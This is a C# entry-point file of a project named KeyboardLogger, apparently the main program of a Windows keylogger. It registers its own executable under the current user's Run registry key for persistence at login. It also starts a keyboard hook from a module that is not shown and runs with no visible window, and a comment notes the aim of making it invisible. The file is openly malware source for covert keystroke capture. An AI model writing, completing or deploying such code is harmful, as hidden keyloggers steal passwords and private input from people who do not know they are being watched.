using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using KeyboardLogger.KeyLog;

namespace KeyboardLogger
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            SetStartup();
            KbdHook.Init();
            Application.Run();
            // time to make things invisible
            // Application.EnableVisualStyles();
            // Application.SetCompatibleTextRenderingDefault(false);
            // Application.Run(new MainWin());
        }


        // SetStartup ()
        // - register this program to run at startup
        static void SetStartup()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("KeyboardLogger", Application.ExecutablePath.ToString());
        }
    }
}
